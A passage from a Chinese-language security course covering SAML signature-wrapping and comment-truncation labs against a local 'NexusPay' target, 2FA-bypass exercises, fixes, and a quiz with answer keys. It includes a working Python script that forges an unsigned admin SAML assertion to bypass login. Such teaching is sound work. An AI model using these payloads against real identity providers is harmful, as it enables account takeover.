每次收到驗證碼，先跑一段 Redis Lua 腳本，在**單一原子步驟**裡檢查挑戰還存不存在，並把 `mfa:attempts:<challengeId>` 加 1：只要挑戰已經不在了，或是加完發現計數 `> 5`，當場把挑戰刪掉並回傳失敗；如果在 5 次額度內（`<= 5`）且驗證碼（或尚未用過的單次高熵備援碼）比對正確，也在同一個原子操作裡立刻把挑戰刪除（若用備援碼則一併原子標記作廢），最後才幫 Session 升上 `aal: 2`。

---

## 動手做

- **難度**：進階
- **預估時間**：60 分鐘

這節我們分兩部分動手實作：**Lab A** 直接在本地的 NexusPay SAML SP 靶機上構造 XSW #3 與 XML 註解截斷封包，親眼看看怎麼不靠私鑰就變身成管理員，接著再親手把它補起來；**Lab B** 則帶你到 PortSwigger Web Security Academy 靶場，把三種最經典的 MFA 狀態機繞過手法摸透。

### Lab A：本地 NexusPay SAML SP 靶機 XSW 與註解截斷實戰

假設本地 Docker Compose 已經跑起 NexusPay 的 SAML SP 接收端點 `http://localhost:3000/v1/auth/saml/acs`（接收 `application/x-www-form-urlencoded` 格式的 `SAMLResponse` 參數），且手邊有一份已用測試 IdP 私鑰簽給普通商戶 `attacker@merchant.test` 的合法 Base64 SAML 憑證檔 `legit_saml.b64`。

1. **任務 1（XSW #3 身分掉包）**：把 `legit_saml.b64` 解開成 XML，在原本的 `<saml:Assertion ID="_assert_legit_01">` 正前方，插進一段沒有簽章的 `<saml:Assertion ID="_assert_evil_99">`（裡面填 `<saml:NameID>admin@nexuspay.example</saml:NameID>`）。重新轉回 Base64 用 `POST` 打進 `/v1/auth/saml/acs`，看看後端是不是真的發了 `admin@nexuspay.example` 的 Session。
2. **任務 2（XML 註解截斷）**：拿起另一份合法簽給 `admin@nexuspay.example.attacker.test` 的憑證檔 `prefix_saml.b64`。這次不准新增或搬動任何標籤，只准在 `<NameID>` 文字中間塞進 `<!-- -->`，送出後觀察簽章有沒有過關、讀出的帳號是不是被切成了 `admin@nexuspay.example`。
3. **任務 3（打上修補並回歸測試）**：照著前面「故障模式與防禦」的三道硬邊界修改本地 SP（入口拒收 `<!--` 註解、限制 `maxAssertions: 1` 且只從驗過章的 `Reference` 子樹讀 `NameID`、補上 `Assertion/@ID` Redis 單次核銷），重跑攻擊腳本確認皆回傳 `400` 或 `401`。

### Lab B：PortSwigger *Authentication* 進階 MFA 繞過檢查點

跑完本地實驗後，請打開 PortSwigger Web Security Academy 的 **Authentication vulnerabilities** 主題，依序挑戰下面三個關卡，並在操作時想清楚每個檢查點點出的狀態機破口：

1. **關卡 1：`2FA simple bypass`**
   - **動手思考**：輸入正確帳密跳到 `/login2` 要求輸入 2FA 驗證碼時，先別輸號碼。打開代理攔截器觀察瀏覽器已拿到的 Cookie，直接把網址改成 `/my-account` 送出。想想看：為什麼後端這時就放行了？保護 `/my-account` 的中介層到底少檢查了 Session 裡的哪個狀態欄位？
2. **關卡 2：`2FA broken logic`**
   - **動手思考**：先用自己的測試帳號（`wiener`）走完一次 2FA，盯著 `POST /login2` 請求看：伺服器到底是看哪個欄位或 Cookie 決定「現在要驗誰的 2FA 碼」？如果把該欄位改成受害者（`carlos`），為什麼還得先幫 `carlos` 觸發一次 `GET /login2` 才能開始撞碼？這暴露了驗證碼生命週期與身分綁定之間出了什麼問題？
3. **關卡 3：`2FA bypass using a brute-force attack`**
   - **動手思考**：面對只有 4 位數（`0000`–`9999`）的驗證碼介面，為什麼光靠前端限制或反向代理上的「每分鐘請求限流」還是擋不住暴力猜測？為什麼真正的解法一定要把錯誤計數器綁在單次 Challenge 上，錯滿次數就整組作廢？

---

### 參考解答

下面提供 Lab A 的 Python 3 自動化攻擊與驗證腳本，你可以直接在本地靶機環境跑起來對照結果：

```python
#!/usr/bin/env python3
"""NexusPay 本地 SAML SP 靶機 XSW #3 與註解截斷驗證腳本"""
import base64
import urllib.parse
import urllib.request
import re

ACS_URL = "http://localhost:3000/v1/auth/saml/acs"

def send_saml(xml_str: str) -> tuple[int, str]:
    b64 = base64.b64encode(xml_str.encode("utf-8")).decode("ascii")
    body = urllib.parse.urlencode({"SAMLResponse": b64}).encode("ascii")
    req = urllib.request.Request(ACS_URL, data=body, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")

# 1. XSW #3：在第一個 <saml:Assertion 前面硬塞一個沒簽章的假 Assertion
with open("legit_saml.b64", "r", encoding="utf-8") as f:
    legit_xml = base64.b64decode(f.read().strip()).decode("utf-8")

evil_assertion = """<saml:Assertion ID="_assert_evil_99" Version="2.0" IssueInstant="2026-11-21T02:00:00Z">
  <saml:Issuer>https://idp.corp.example</saml:Issuer>
  <saml:Subject><saml:NameID>admin@nexuspay.example</saml:NameID></saml:Subject>
</saml:Assertion>"""

xsw3_xml = legit_xml.replace("<saml:Assertion ", evil_assertion + "\n<saml:Assertion ", 1)
status_xsw, body_xsw = send_saml(xsw3_xml)
print(f"[XSW #3] HTTP {status_xsw}: {body_xsw[:120]}")

# 2. XML 註解截斷：在合法前綴帳號中間插進 <!-- -->
with open("prefix_saml.b64", "r", encoding="utf-8") as f:
    prefix_xml = base64.b64decode(f.read().strip()).decode("utf-8")

comment_xml = re.sub(
    r"(<saml:NameID>admin@nexuspay\.example)(\.attacker\.test</saml:NameID>)",
    r"\1<!-- -->\2",
    prefix_xml,
    count=1,
)
status_cmt, body_cmt = send_saml(comment_xml)
print(f"[Comment Truncation] HTTP {status_cmt}: {body_cmt[:120]}")
```

#### 修補前後的結果對照

在還沒修補的脆弱版靶機上跑這支腳本，兩筆攻擊都會順利穿過驗章，拿到 `200 OK`（或 `302` 跳轉），而且回傳建立的登入身分都是最高管理員 `admin@nexuspay.example`（測試時記得同時檢查 HTTP 狀態碼與回傳的已認證 `NameID`）。

一旦補齊「入口拒收 `<!--` 註解」、「強制單一 `<Assertion>`（`maxAssertions: 1`）且只從驗過章的 `Reference` 子樹讀值」與「`Assertion/@ID` Redis 單次核銷」三道防線：第一筆 XSW #3 會在 `verifyAndExtractSignedAssertion` 檢查單一 Assertion 結構時直接拋出 `UnauthorizedException`，回傳 `401 Unauthorized`；第二筆註解截斷則在第一關正規表達式掃到 `<!--` 時就被當場攔下，回傳 `400 Bad Request`。

#### Lab B 三個關卡的破口小結

- **`2FA simple bypass`**：破口在於後端在第一關驗完密碼就發了具備完整權限的 Session。正確做法是第一關只給 `aal: 1` 的受限狀態，並在所有業務路由掛上強制檢查 `aal >= 2` 的 Guard。
- **`2FA broken logic`**：破口在於後端竟然相信前端傳上來的參數（像 Cookie 裡的 `verify=carlos`）來決定要驗誰的驗證碼，沒有把 OTP 驗證流程死死綁在伺服器端不可竄改的 `pre_auth_session` 上。
- **`2FA bypass using a brute-force attack`**：證明了只有 4 位數（`10,000` 種組合）的短驗證碼，如果沒有「單一 Challenge 猜錯 5 次立刻整組作廢」的硬限制，光靠外層擋 IP 或逼人重登，還是會被自動化腳本硬生生撞開。

---

## 自我檢核

- **難度**：進階
- **預估時間**：25 分鐘

闔上前面的程式碼，試著用自己的話回答下面四個真實審計場景的問題：

1. **C14N 為什麼對註解視而不見**：在某企業 SSO 串接中，攻擊者把憑證裡的 `<saml:NameID>ceo@partner.org.sandbox.net</saml:NameID>` 改成了 `<saml:NameID>ceo@partner.org<!-- -->.sandbox.net</saml:NameID>`。請問為什麼這份被動過手腳的 XML，送進標準的 `xml-exc-c14n#` 與 RSA-SHA256 驗章器時還能順利通過？後端又是用了哪一種 DOM 取值寫法，才讓後半截的 `.sandbox.net` 憑空消失？
2. **XSW 變體防禦盲區**：某團隊為了防範 XSW #3（前置插入兄弟 Assertion），在程式裡加了一條檢查：「確認 `<Response>` 底下的直接子節點只能有一個 `<Assertion>`」。如果他們依然用 `doc.getElementsByTagName("saml:NameID")[0]` 取登入帳號，攻擊者改用 **XSW #6**（把已簽章的 `<Assertion>` 搬進 `<ds:Signature><ds:Object>` 裡，再把外層唯一的 `<Assertion>` 換成假帳號）能不能繞過？真正的根治做法是什麼？
3. **WebAuthn 位元旗標判讀**：NexusPay 的安全稽核員在檢查大額提領（`$100.00`）的 WebAuthn 驗證紀錄時，發現有一筆過關的請求，其 `authenticatorData` 第 32 個 byte（`flags`）的十六進位值是 `0x01`。請問這代表硬體認證器當時完成了什麼動作、又沒做什麼動作？如果後端直接放行 `0x01`，在什麼實際場景下會出大事？
4. **設計防跳步與防換 IP 撞碼的 MFA 狀態機**：現在要請你幫 NexusPay 的 `$100.00`（`10,000` 分）商戶提領 API 設計一套 6 位數 TOTP 的 Step-Up 驗證流程。請具體說明你的 Session 狀態欄位與 Redis 鍵值要怎麼設計，才能同時擋下「只過第一關就偷打提領 API 跳步」以及「掛代理池每秒換 IP 併發窮舉 6 位數驗證碼」？

---

### 參考解答

1. **C14N 為什麼對註解視而不見**：
   - 因為標準的 Exclusive C14N（`http://www.w3.org/2001/10/xml-exc-c14n#`，未帶 `#WithComments`）在規範裡定義了「正規化輸出不包含註解節點」。在算 SHA-256 摘要前，C14N 會自動把中間的 `<!-- -->` 抹掉，把前後文字黏回原本的 `ceo@partner.org.sandbox.net`，算出來的雜湊自然跟 IdP 簽發時分毫不差。
   - 後端會被截斷，是因為保留註解的 DOM 解析器把 `<NameID>` 裡面切成了三個子節點：`Text("ceo@partner.org")`、`Comment(" ")` 與 `Text(".sandbox.net")`。當開發者寫出 `nameIdNode.firstChild.nodeValue` 時，只拿了第一個文字子節點，後面的 `.sandbox.net` 就這樣被丟掉了。
2. **XSW 變體防禦盲區**：
   - **完全可以繞過**。因為在 XSW #6 裡，`<Response>` 的直接子節點確實只剩那一個假 `<Assertion>`（通過新加的檢查），而真正帶簽章的原版 `<Assertion>` 被藏進了 `<ds:Signature><ds:Object>` 肚子裡。驗章器順著 `URI="#_legit_id"` 鑽進 `<ds:Object>` 驗完簽章回傳 `true` 後，業務層呼叫 `getElementsByTagName("saml:NameID")[0]` 由上往下找，第一個撞見的依然是外層那個沒簽章的假 `<Assertion>`。
   - **根治做法**：除了用嚴格的 XSD Schema 禁止 `<ds:Object>` 或 `<Extensions>` 裡面偷塞 `<Assertion>` 之外，最核心的鐵律是**業務層絕對不准自己去全文件搜尋 DOM 節點**，只能接收驗章器回傳的那個「已經確認被 `<ds:Reference>` 簽章鎖定的 DOM 節點參考」，直接從這棵受保護的子樹往下讀出 `/saml:Assertion/saml:Subject/saml:NameID`。
3. **WebAuthn 位元旗標判讀**：
   - `flags = 0x01` 代表只有 bit 0（`UP`，User Present）是 `1`，而 bit 2（`UV`，User Verification，`0x04`）是 `0`。這表示當時只確認了「有人按了一下實體安全金鑰」，但認證器**完全沒有在本地檢查使用者的 PIN 碼或生物辨識（指紋／臉部）**。
   - 如果大額提領直接放行 `0x01`，萬一商戶老闆放在桌上的硬體安全金鑰被偷或撿走，而攻擊者又已經透過其他管道拿到基礎登入狀態，攻擊者根本不需要知道金鑰的 PIN 碼，插上電腦摸一下就能直接把帳戶裡的錢轉走。高風險 Step-Up 認證必須強制檢查 `(flags & 0x04) !== 0`。
4. **設計防跳步與防換 IP 撞碼的 MFA 狀態機**：
   - **防跳步**：在第一關登入完成時，Redis Session 裡的保證等級只給 `aal: 1`。保護提領 API 的 `Aal2Guard` 強制檢查 Session 的 `aal === 2`（且核對 `verifiedAt` 沒超過短效時間窗），沒達標一律回傳 `403 Forbidden`，絕不相信前端跳轉。
   - **防換 IP 併發撞碼**：使用者發起提領 MFA 時，後端產生唯一的 `challengeId` 並將 Redis 計數 `mfa:attempts:<challengeId>` 初始化為 `0`。每次收到驗證碼，先用 Redis Lua 腳本原子化檢查挑戰是否存在並將計數 `INCR` 加 1；只要計數 `> 5`，當場 `DEL` 刪掉挑戰並拒絕（就算換一萬個 IP，打的仍是同一個 `challengeId`）；若在 5 次內且驗證碼正確，也在同一段 Lua 原子腳本裡立刻刪除挑戰，才將 Session 升為 `aal: 2`。

---

## 延伸閱讀

- **SAML 2.0 與 XSW 經典論文**：OASIS *Assertions and Protocols for the OASIS Security Assertion Markup Language (SAML) V2.0* 官方規格書；以及 Juraj Somorovsky 等人於 2012 年發表的 *"On Breaking SAML: Be Whoever You Want to Be"*（定義 XSW #1–#8 攻擊分類的開山之作）。
- **SAML 註解截斷漏洞公告**：CERT/CC Vulnerability Note **VU#475445** 與 Duo Security 2018 年的技術披露報告，詳細拆解了 `ruby-saml`（CVE-2017-11428）、`python-saml`（CVE-2017-11427）與 `saml2-js`（CVE-2017-11429）當初是怎麼栽在 `firstChild` 與 C14N 註解剝離上的。
- **WebAuthn / FIDO2 官方驗證規範**：W3C *Web Authentication: An API for accessing Public Key Credentials*（Level 2 / Level 3）第 7.2 節 `Verifying an Authentication Assertion`，一步步列出了 Relying Party 後端必檢的 `rpIdHash`、`UP`/`UV` flags 與 `challenge` 核對清單。
- **線上實戰靶場**：PortSwigger Web Security Academy — *Authentication vulnerabilities*（特別推薦親手打通 *2FA simple bypass*、*2FA broken logic* 與 *2FA bypass using a brute-force attack* 三個實驗）。
